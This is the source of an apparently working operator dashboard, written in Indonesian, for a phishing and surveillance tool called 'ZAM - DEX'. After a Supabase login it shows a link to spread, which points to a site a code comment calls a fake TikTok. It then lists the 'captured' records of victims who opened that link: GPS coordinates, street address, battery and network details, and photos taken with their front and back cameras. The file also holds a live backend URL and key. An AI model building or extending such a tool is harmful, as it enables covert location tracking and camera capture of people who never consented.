<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ZAM - DEX</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Bebas+Neue&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
:root {
  --black: #0a0a0a;
  --dark: #111111;
  --dark2: #1a1a1a;
  --dark3: #242424;
  --gray: #888888;
  --gray2: #555555;
  --white: #f0f0f0;
  --white2: #cccccc;
  --red: #dc2626;
  --red2: #ef4444;
  --red3: #7f1d1d;
  --border: rgba(255,255,255,0.08);
}

* { margin: 0; padding: 0; box-sizing: border-box; }

body {
  background: var(--black);
  color: var(--white);
  font-family: 'Inter', sans-serif;
  min-height: 100vh;
  overflow-x: hidden;
}

/* ===== NOISE OVERLAY ===== */
body::before {
  content: '';
  position: fixed;
  inset: 0;
  background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.65' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E");
  pointer-events: none;
  z-index: 9999;
  opacity: 0.4;
}

/* ===== AUTH SCREEN ===== */
#authScreen {
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 20px;
  background: 
    radial-gradient(ellipse at 0% 0%, rgba(220,38,38,0.12) 0%, transparent 50%),
    radial-gradient(ellipse at 100% 100%, rgba(180,180,180,0.05) 0%, transparent 50%),
    var(--black);
}

.auth-box {
  width: 100%;
  max-width: 400px;
  animation: fadeInUp 0.5s ease;
}

@keyframes fadeInUp {
  from { opacity: 0; transform: translateY(30px); }
  to { opacity: 1; transform: translateY(0); }
}

.logo-wrap {
  text-align: center;
  margin-bottom: 40px;
}
.logo-img {
  width: 64px;
  height: 64px;
  border-radius: 14px;
  margin-bottom: 14px;
  object-fit: cover;
  border: 1px solid var(--border);
}
.logo-title {
  font-family: 'Bebas Neue', cursive;
  font-size: 42px;
  letter-spacing: 4px;
  color: var(--white);
  line-height: 1;
}
.logo-sub {
  font-size: 11px;
  color: var(--gray);
  letter-spacing: 3px;
  text-transform: uppercase;
  margin-top: 6px;
  font-family: 'Share Tech Mono', monospace;
}

.tab-row {
  display: flex;
  border-bottom: 1px solid var(--border);
  margin-bottom: 32px;
}
.tab-btn {
  flex: 1;
  padding: 12px;
  background: none;
  border: none;
  color: var(--gray);
  font-size: 14px;
  font-weight: 600;
  cursor: pointer;
  font-family: 'Inter', sans-serif;
  letter-spacing: 1px;
  text-transform: uppercase;
  position: relative;
  transition: color 0.2s;
}
.tab-btn.active {
  color: var(--white);
}
.tab-btn.active::after {
  content: '';
  position: absolute;
  bottom: -1px;
  left: 0; right: 0;
  height: 2px;
  background: var(--red);
}

.form-group {
  margin-bottom: 16px;
}
.form-group label {
  display: block;
  font-size: 11px;
  color: var(--gray);
  letter-spacing: 2px;
  text-transform: uppercase;
  margin-bottom: 8px;
  font-family: 'Share Tech Mono', monospace;
}
.form-group input {
  width: 100%;
  padding: 14px 16px;
  background: var(--dark2);
  border: 1px solid var(--border);
  border-radius: 8px;
  color: var(--white);
  font-size: 15px;
  font-family: 'Inter', sans-serif;
  outline: none;
  transition: border-color 0.2s;
}
.form-group input:focus {
  border-color: var(--red);
}
.form-group input::placeholder { color: var(--gray2); }

.btn-primary {
  width: 100%;
  padding: 15px;
  background: var(--red);
  color: #fff;
  border: none;
  border-radius: 8px;
  font-size: 15px;
  font-weight: 700;
  letter-spacing: 2px;
  text-transform: uppercase;
  cursor: pointer;
  font-family: 'Inter', sans-serif;
  margin-top: 8px;
  position: relative;
  overflow: hidden;
  transition: background 0.2s, transform 0.1s;
}
.btn-primary:hover { background: var(--red2); }
.btn-primary:active { transform: scale(0.98); }
.btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }

.err-msg {
  display: none;
  background: rgba(220,38,38,0.15);
  border: 1px solid rgba(220,38,38,0.3);
  color: #fca5a5;
  padding: 12px 14px;
  border-radius: 8px;
  font-size: 13px;
  margin-bottom: 16px;
}
.err-msg.show { display: block; }

/* ===== MAIN APP ===== */
#appScreen { display: none; min-height: 100vh; }

/* HEADER */
.app-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 16px 24px;
  border-bottom: 1px solid var(--border);
  position: sticky;
  top: 0;
  background: rgba(10,10,10,0.9);
  backdrop-filter: blur(20px);
  z-index: 100;
}
.header-logo {
  display: flex;
  align-items: center;
  gap: 12px;
}
.header-logo img {
  width: 32px;
  height: 32px;
  border-radius: 6px;
}
.header-logo span {
  font-family: 'Bebas Neue', cursive;
  font-size: 24px;
  letter-spacing: 3px;
}
.header-right {
  display: flex;
  align-items: center;
  gap: 16px;
}
.user-badge {
  font-size: 12px;
  color: var(--gray);
  font-family: 'Share Tech Mono', monospace;
}
.btn-logout {
  padding: 7px 14px;
  background: transparent;
  border: 1px solid var(--border);
  color: var(--gray);
  border-radius: 6px;
  font-size: 12px;
  cursor: pointer;
  font-family: 'Inter', sans-serif;
  transition: all 0.2s;
}
.btn-logout:hover { border-color: var(--red); color: var(--red); }

/* DASHBOARD */
.app-body { padding: 24px; max-width: 900px; margin: 0 auto; }

.section-title {
  font-family: 'Bebas Neue', cursive;
  font-size: 28px;
  letter-spacing: 3px;
  margin-bottom: 6px;
}
.section-sub {
  font-size: 12px;
  color: var(--gray);
  font-family: 'Share Tech Mono', monospace;
  margin-bottom: 24px;
}

/* LINK BOX */
.link-section {
  background: var(--dark2);
  border: 1px solid var(--border);
  border-radius: 12px;
  padding: 20px;
  margin-bottom: 24px;
}
.link-label {
  font-size: 11px;
  color: var(--gray);
  letter-spacing: 2px;
  text-transform: uppercase;
  font-family: 'Share Tech Mono', monospace;
  margin-bottom: 10px;
}
.link-row {
  display: flex;
  gap: 10px;
  align-items: center;
}
.link-input {
  flex: 1;
  padding: 11px 14px;
  background: var(--dark3);
  border: 1px solid var(--border);
  border-radius: 8px;
  color: var(--red2);
  font-family: 'Share Tech Mono', monospace;
  font-size: 13px;
  outline: none;
  cursor: text;
}
.btn-copy {
  padding: 11px 16px;
  background: var(--dark3);
  border: 1px solid var(--border);
  color: var(--white2);
  border-radius: 8px;
  font-size: 13px;
  cursor: pointer;
  font-family: 'Inter', sans-serif;
  transition: all 0.2s;
  white-space: nowrap;
}
.btn-copy:hover { border-color: var(--red); color: var(--red); }
.btn-copy.copied { border-color: #22c55e; color: #22c55e; }

/* CAPTURES LIST */
.captures-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 16px;
}
.btn-refresh {
  padding: 8px 16px;
  background: transparent;
  border: 1px solid var(--border);
  color: var(--gray);
  border-radius: 6px;
  font-size: 13px;
  cursor: pointer;
  font-family: 'Inter', sans-serif;
  transition: all 0.2s;
}
.btn-refresh:hover { border-color: var(--white2); color: var(--white2); }

.empty-state {
  background: var(--dark2);
  border: 1px solid var(--border);
  border-radius: 12px;
  padding: 60px 20px;
  text-align: center;
  color: var(--gray);
}
.empty-state .big-icon { font-size: 48px; margin-bottom: 14px; }
.empty-state p { font-size: 14px; }

/* CAPTURE CARD */
.capture-card {
  background: var(--dark2);
  border: 1px solid var(--border);
  border-radius: 12px;
  margin-bottom: 12px;
  overflow: hidden;
  transition: border-color 0.2s;
}
.capture-card:hover { border-color: var(--red3); }
.capture-card-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 16px 20px;
  cursor: pointer;
  user-select: none;
}
.capture-id {
  font-family: 'Share Tech Mono', monospace;
  font-size: 13px;
  color: var(--red2);
}
.capture-time {
  font-size: 12px;
  color: var(--gray);
}
.capture-chevron {
  font-size: 16px;
  color: var(--gray);
  transition: transform 0.2s;
}
.capture-card.open .capture-chevron { transform: rotate(180deg); }

.capture-body {
  display: none;
  padding: 0 20px 20px;
  border-top: 1px solid var(--border);
}
.capture-card.open .capture-body { display: block; }

/* DATA GRID */
.data-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 10px;
  margin-top: 16px;
}
@media(max-width: 600px) { .data-grid { grid-template-columns: 1fr; } }

.data-item {
  background: var(--dark3);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 12px 14px;
}
.data-item-label {
  font-size: 10px;
  color: var(--gray);
  letter-spacing: 2px;
  text-transform: uppercase;
  font-family: 'Share Tech Mono', monospace;
  margin-bottom: 6px;
}
.data-item-value {
  font-size: 14px;
  color: var(--white2);
  word-break: break-all;
  line-height: 1.4;
}
.data-item-value.red { color: var(--red2); }
.data-item.full { grid-column: 1 / -1; }

/* PHOTOS */
.photos-row {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 10px;
  margin-top: 10px;
}
.photo-wrap {
  background: var(--dark3);
  border: 1px solid var(--border);
  border-radius: 8px;
  overflow: hidden;
}
.photo-label {
  padding: 8px 12px;
  font-size: 10px;
  color: var(--gray);
  letter-spacing: 2px;
  font-family: 'Share Tech Mono', monospace;
  text-transform: uppercase;
  border-bottom: 1px solid var(--border);
}
.photo-wrap img {
  width: 100%;
  max-height: 200px;
  object-fit: cover;
  display: block;
}
.no-photo {
  padding: 24px;
  text-align: center;
  font-size: 12px;
  color: var(--gray);
}

/* MAP LINK */
.map-link {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  padding: 8px 14px;
  background: transparent;
  border: 1px solid var(--red3);
  color: var(--red2);
  border-radius: 6px;
  font-size: 13px;
  text-decoration: none;
  margin-top: 10px;
  font-family: 'Share Tech Mono', monospace;
  transition: all 0.2s;
  display: inline-flex;
}
.map-link:hover { background: rgba(220,38,38,0.1); }

/* LOADING */
.loading-spinner {
  text-align: center;
  padding: 40px;
  color: var(--gray);
  font-family: 'Share Tech Mono', monospace;
  font-size: 13px;
}

/* TOAST */
.toast {
  position: fixed;
  bottom: 24px;
  right: 24px;
  background: var(--dark3);
  border: 1px solid var(--border);
  color: var(--white);
  padding: 12px 18px;
  border-radius: 8px;
  font-size: 13px;
  z-index: 10000;
  transform: translateY(80px);
  opacity: 0;
  transition: all 0.3s;
  font-family: 'Inter', sans-serif;
}
.toast.show { transform: translateY(0); opacity: 1; }
.toast.success { border-color: #22c55e; color: #86efac; }
.toast.error { border-color: var(--red); color: #fca5a5; }
</style>
</head>
<body>

<!-- ===== AUTH SCREEN ===== -->
<div id="authScreen">
  <div class="auth-box">
    <div class="logo-wrap">
      <img class="logo-img" src="https://files.catbox.moe/lrn5qr.png" alt="ZAM-DEX" onerror="this.style.background='#dc2626';this.src='data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'">
      <div class="logo-title">ZAM - DEX</div>
      <div class="logo-sub">Intelligence Platform</div>
    </div>

    <div class="tab-row">
      <button class="tab-btn active" onclick="switchTab('login')">Login</button>
      <button class="tab-btn" onclick="switchTab('register')">Register</button>
    </div>

    <div id="errMsg" class="err-msg"></div>

    <!-- LOGIN FORM -->
    <div id="loginForm">
      <div class="form-group">
        <label>Email</label>
        <input type="email" id="loginEmail" placeholder="nama@email.com">
      </div>
      <div class="form-group">
        <label>Password</label>
        <input type="password" id="loginPass" placeholder="••••••••">
      </div>
      <button class="btn-primary" onclick="handleLogin()" id="loginBtn">MASUK</button>
    </div>

    <!-- REGISTER FORM -->
    <div id="registerForm" style="display:none">
      <div class="form-group">
        <label>Email</label>
        <input type="email" id="regEmail" placeholder="nama@email.com">
      </div>
      <div class="form-group">
        <label>Password</label>
        <input type="password" id="regPass" placeholder="Min. 8 karakter">
      </div>
      <div class="form-group">
        <label>Konfirmasi Password</label>
        <input type="password" id="regPass2" placeholder="Ulangi password">
      </div>
      <button class="btn-primary" onclick="handleRegister()" id="regBtn">DAFTAR</button>
    </div>
  </div>
</div>

<!-- ===== APP SCREEN ===== -->
<div id="appScreen">
  <header class="app-header">
    <div class="header-logo">
      <img src="https://files.catbox.moe/lrn5qr.png" alt="ZAM-DEX" onerror="this.style.display='none'">
      <span>ZAM - DEX</span>
    </div>
    <div class="header-right">
      <span class="user-badge" id="userBadge"></span>
      <button class="btn-logout" onclick="handleLogout()">LOGOUT</button>
    </div>
  </header>

  <div class="app-body">
    <div class="section-title">DASHBOARD</div>
    <div class="section-sub" id="captureCount">// Memuat data...</div>

    <!-- LINK TO SHARE -->
    <div class="link-section">
      <div class="link-label">// Link untuk disebarkan</div>
      <div class="link-row">
        <input class="link-input" id="shareLink" value="Konfigurasi URL website1 dulu..." readonly>
        <button class="btn-copy" id="copyBtn" onclick="copyLink()">Salin Link</button>
      </div>
    </div>

    <!-- CAPTURES -->
    <div class="captures-header">
      <div>
        <div class="section-title" style="margin-bottom:0;font-size:22px">DATA TANGKAPAN</div>
      </div>
      <button class="btn-refresh" onclick="loadCaptures()">&#8635; Refresh</button>
    </div>

    <div id="capturesList">
      <div class="loading-spinner">Memuat data...</div>
    </div>
  </div>
</div>

<div class="toast" id="toast"></div>

<!-- SUPABASE SDK -->
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
<script>
// ===== CONFIG - GANTI INI =====
const SUPABASE_URL = "https://dyevsyujenhtzkcwtxpd.supabase.co";
const SUPABASE_ANON_KEY = "sb_publishable_pgPPD26ilzp1nstqLG5lCw_wxhoM5dQ";
const WEBSITE1_URL = "https://vt-tiktok-com-official.vercel.app"; // URL website fake tiktok

// ===== INIT SUPABASE =====
const { createClient } = supabase;
const sb = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// ===== TOAST =====
function showToast(msg, type = '') {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.className = `toast ${type} show`;
  setTimeout(() => t.classList.remove('show'), 3000);
}

// ===== TAB SWITCH =====
function switchTab(tab) {
  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
  event.target.classList.add('active');
  document.getElementById('loginForm').style.display = tab === 'login' ? 'block' : 'none';
  document.getElementById('registerForm').style.display = tab === 'register' ? 'block' : 'none';
  document.getElementById('errMsg').classList.remove('show');
}

function showErr(msg) {
  const el = document.getElementById('errMsg');
  el.textContent = msg;
  el.classList.add('show');
}

// ===== AUTH =====
async function handleLogin() {
  const email = document.getElementById('loginEmail').value.trim();
  const pass = document.getElementById('loginPass').value;
  if (!email || !pass) { showErr("Isi semua field."); return; }
  
  const btn = document.getElementById('loginBtn');
  btn.disabled = true; btn.textContent = 'Memproses...';
  
  const { data, error } = await sb.auth.signInWithPassword({ email, password: pass });
  btn.disabled = false; btn.textContent = 'MASUK';
  
  if (error) { showErr(error.message); return; }
  openApp(data.user);
}

async function handleRegister() {
  const email = document.getElementById('regEmail').value.trim();
  const pass = document.getElementById('regPass').value;
  const pass2 = document.getElementById('regPass2').value;
  
  if (!email || !pass || !pass2) { showErr("Isi semua field."); return; }
  if (pass !== pass2) { showErr("Password tidak cocok."); return; }
  if (pass.length < 8) { showErr("Password minimal 8 karakter."); return; }
  
  const btn = document.getElementById('regBtn');
  btn.disabled = true; btn.textContent = 'Mendaftar...';
  
  const { data, error } = await sb.auth.signUp({ email, password: pass });
  btn.disabled = false; btn.textContent = 'DAFTAR';
  
  if (error) { showErr(error.message); return; }
  showToast("Akun berhasil dibuat! Silakan login.", "success");
  switchTab('login');
  document.querySelector('.tab-btn').click();
}

async function handleLogout() {
  await sb.auth.signOut();
  document.getElementById('appScreen').style.display = 'none';
  document.getElementById('authScreen').style.display = 'flex';
}

// ===== CHECK SESSION =====
sb.auth.onAuthStateChange((event, session) => {
  if (session) {
    openApp(session.user);
  }
});

function openApp(user) {
  document.getElementById('authScreen').style.display = 'none';
  document.getElementById('appScreen').style.display = 'block';
  document.getElementById('userBadge').textContent = user.email;
  document.getElementById('shareLink').value = WEBSITE1_URL;
  loadCaptures();
}

// ===== COPY LINK =====
function copyLink() {
  const val = document.getElementById('shareLink').value;
  navigator.clipboard.writeText(val).then(() => {
    const btn = document.getElementById('copyBtn');
    btn.textContent = 'Tersalin!';
    btn.classList.add('copied');
    setTimeout(() => { btn.textContent = 'Salin Link'; btn.classList.remove('copied'); }, 2000);
  });
}

// ===== LOAD CAPTURES =====
async function loadCaptures() {
  const list = document.getElementById('capturesList');
  list.innerHTML = '<div class="loading-spinner">// Memuat data tangkapan...</div>';
  
  const { data, error } = await sb
    .from('captures')
    .select('*')
    .order('created_at', { ascending: false });
  
  if (error) {
    list.innerHTML = `<div class="empty-state"><div class="big-icon">!</div><p>Error: ${error.message}</p></div>`;
    return;
  }
  
  document.getElementById('captureCount').textContent = `// Total: ${data.length} tangkapan`;
  
  if (data.length === 0) {
    list.innerHTML = `
      <div class="empty-state">
        <div class="big-icon">&#128293;</div>
        <p>Belum ada data. Sebar link-nya dulu.</p>
      </div>`;
    return;
  }
  
  list.innerHTML = data.map((c, i) => buildCard(c, i)).join('');
}

// ===== BUILD CARD =====
function buildCard(c, i) {
  const geo = c.geo_raw ? JSON.parse(c.geo_raw) : null;
  const addr = geo?.address || {};
  
  const kelurahan = addr.village || addr.suburb || addr.quarter || '-';
  const kecamatan = addr.city_district || addr.district || '-';
  const kota = addr.city || addr.town || addr.municipality || '-';
  const provinsi = addr.state || '-';
  const negara = addr.country || '-';
  const kodePos = addr.postcode || '-';

  const timeStr = c.created_at ? new Date(c.created_at).toLocaleString('id-ID') : '-';
  const tokenShort = c.token ? c.token.slice(0, 16) + '...' : `capture-${i+1}`;
  
  const battery = c.battery ? `${c.battery}%${c.charging ? ' (Charging)' : ''}` : '-';
  const network = c.network_type ? `${c.network_type}${c.downlink ? ' / '+c.downlink+'Mbps' : ''}` : '-';
  const screen = (c.screen_width && c.screen_height) ? `${c.screen_width}x${c.screen_height}` : '-';

  const hasLoc = c.latitude && c.longitude;
  const mapUrl = hasLoc ? `https://maps.google.com/?q=${c.latitude},${c.longitude}` : null;

  return `
  <div class="capture-card" id="card-${i}">
    <div class="capture-card-header" onclick="toggleCard(${i})">
      <div>
        <div class="capture-id">#${tokenShort}</div>
        <div class="capture-time">${timeStr}</div>
      </div>
      <span class="capture-chevron">&#8964;</span>
    </div>
    <div class="capture-body">
      
      <!-- LOKASI -->
      <div style="margin-top:16px;margin-bottom:6px;font-size:11px;color:var(--gray);letter-spacing:2px;font-family:'Share Tech Mono',monospace;">// LOKASI</div>
      <div class="data-grid">
        <div class="data-item">
          <div class="data-item-label">Kelurahan</div>
          <div class="data-item-value red">${kelurahan}</div>
        </div>
        <div class="data-item">
          <div class="data-item-label">Kecamatan</div>
          <div class="data-item-value red">${kecamatan}</div>
        </div>
        <div class="data-item">
          <div class="data-item-label">Kota</div>
          <div class="data-item-value red">${kota}</div>
        </div>
        <div class="data-item">
          <div class="data-item-label">Provinsi</div>
          <div class="data-item-value red">${provinsi}</div>
        </div>
        <div class="data-item">
          <div class="data-item-label">Negara</div>
          <div class="data-item-value">${negara}</div>
        </div>
        <div class="data-item">
          <div class="data-item-label">Kode Pos</div>
          <div class="data-item-value">${kodePos}</div>
        </div>
        ${hasLoc ? `
        <div class="data-item full">
          <div class="data-item-label">Koordinat GPS</div>
          <div class="data-item-value red">${c.latitude}, ${c.longitude} (akurasi: ${c.accuracy ? Math.round(c.accuracy)+'m' : '-'})</div>
        </div>` : ''}
      </div>
      ${mapUrl ? `<a class="map-link" href="${mapUrl}" target="_blank">&#127757; Buka di Google Maps</a>` : ''}

      <!-- PERANGKAT -->
      <div style="margin-top:20px;margin-bottom:6px;font-size:11px;color:var(--gray);letter-spacing:2px;font-family:'Share Tech Mono',monospace;">// PERANGKAT</div>
      <div class="data-grid">
        <div class="data-item">
          <div class="data-item-label">Baterai</div>
          <div class="data-item-value red">${battery}</div>
        </div>
        <div class="data-item">
          <div class="data-item-label">Jaringan</div>
          <div class="data-item-value red">${network}</div>
        </div>
        <div class="data-item">
          <div class="data-item-label">Resolusi Layar</div>
          <div class="data-item-value">${screen}</div>
        </div>
        <div class="data-item">
          <div class="data-item-label">Bahasa</div>
          <div class="data-item-value">${c.language || '-'}</div>
        </div>
        <div class="data-item full">
          <div class="data-item-label">User Agent</div>
          <div class="data-item-value" style="font-size:11px;color:var(--gray)">${c.user_agent || '-'}</div>
        </div>
      </div>

      <!-- FOTO -->
      <div style="margin-top:20px;margin-bottom:6px;font-size:11px;color:var(--gray);letter-spacing:2px;font-family:'Share Tech Mono',monospace;">// FOTO KAMERA</div>
      <div class="photos-row">
        <div class="photo-wrap">
          <div class="photo-label">Kamera Belakang</div>
          ${c.photo_back
            ? `<img src="${c.photo_back}" alt="Kamera belakang" onclick="openPhoto('${c.photo_back}')" style="cursor:zoom-in">`
            : '<div class="no-photo">Tidak ada foto</div>'}
        </div>
        <div class="photo-wrap">
          <div class="photo-label">Kamera Depan</div>
          ${c.photo_front
            ? `<img src="${c.photo_front}" alt="Kamera depan" onclick="openPhoto('${c.photo_front}')" style="cursor:zoom-in">`
            : '<div class="no-photo">Tidak ada foto</div>'}
        </div>
      </div>

    </div>
  </div>`;
}

function toggleCard(i) {
  document.getElementById(`card-${i}`).classList.toggle('open');
}

function openPhoto(src) {
  const w = window.open('', '_blank');
  w.document.write(`<html><body style="margin:0;background:#000"><img src="${src}" style="max-width:100%;max-height:100vh;display:block;margin:auto"></body></html>`);
}
</script>
</body>
</html>
